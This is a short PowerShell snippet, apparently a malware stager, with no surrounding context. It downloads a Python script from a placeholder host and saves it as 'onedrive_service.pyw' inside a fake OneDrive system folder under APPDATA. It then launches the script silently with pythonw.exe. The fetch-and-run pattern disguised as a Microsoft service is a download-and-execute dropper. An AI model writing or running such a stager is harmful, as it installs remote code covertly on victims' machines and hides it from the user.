
$pyurl = "http://example.com/onedrive_service.pyw"
$out = "$env:APPDATA\Microsoft\OneDrive\System\onedrive_service.pyw"
Invoke-WebRequest $pyurl -OutFile $out
Start-Process "pythonw.exe" $out
